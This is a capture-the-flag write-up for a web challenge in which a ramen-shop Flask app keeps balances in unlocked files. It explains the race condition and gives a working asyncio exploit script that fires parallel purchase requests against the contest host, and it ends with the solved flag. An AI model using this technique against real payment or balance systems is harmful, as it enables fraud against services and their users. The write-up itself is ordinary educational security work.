# Can't use DB

Category: Web

> Can't use DB.
> I have so little money that I can't even buy the ingredients for ramen.
> 🍜

`app.py`

```python
@app.route("/buy_noodles", methods=["POST"])
def buy_noodles():
    user_id = session.get("user")
    if not user_id:
        return redirect("/")
    balance, noodles, soup = get_userdata(user_id)
    if balance >= 10000:
        noodles += 1
        open(f"./users/{user_id}/noodles.txt", "w").write(str(noodles))
        time.sleep(random.uniform(-0.2, 0.2) + 1.0)
        balance -= 10000
        open(f"./users/{user_id}/balance.txt", "w").write(str(balance))
        return "💸$10000"
    return "ERROR: INSUFFICIENT FUNDS"


@app.route("/buy_soup", methods=["POST"])
def buy_soup():
    user_id = session.get("user")
    if not user_id:
        return redirect("/")
    balance, noodles, soup = get_userdata(user_id)
    if balance >= 20000:
        soup += 1
        open(f"./users/{user_id}/soup.txt", "w").write(str(soup))
        time.sleep(random.uniform(-0.2, 0.2) + 1.0)
        balance -= 20000
        open(f"./users/{user_id}/balance.txt", "w").write(str(balance))
        return "💸💸$20000"
    return "ERROR: INSUFFICIENT FUNDS"


@app.route("/eat")
def eat():
    user_id = session.get("user")
    if not user_id:
        return redirect("/")
    balance, noodles, soup = get_userdata(user_id)
    shutil.rmtree(f"./users/{user_id}/")
    session["user"] = None
    if (noodles >= 2) and (soup >= 1):
        return os.getenv("CTF4B_FLAG")
    if (noodles >= 2):
        return "The noodles seem to get stuck in my throat."
    if (soup >= 1):
        return "This is soup, not ramen."
    return "Please make ramen."
```

The app stores data in files, without any kind of locking. By sending parallel requests, we can buy noodles and soup without updating the balance. 

Exploit:

```python
import aiohttp
import asyncio

async def fetch(url, session):
    return await session.post(url)


async def run():
    async with aiohttp.ClientSession() as session:
        root = "https://cant-use-db.quals.beginners.seccon.jp/"
        r1 = await (await session.get(root)).text()
        print(session.cookie_jar.filter_cookies(root))
        tasks = [session.post(root+"/buy_noodles"),session.post(root+"/buy_noodles"),session.post(root+"/buy_soup")]
        responses = await asyncio.gather(*tasks)
        r2 = await (await session.get(root+"/eat")).text()
        print(r2)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run())
```

`Flag: ctf4b{r4m3n_15_4n_3553n714l_d15h_f0r_h4ck1n6}`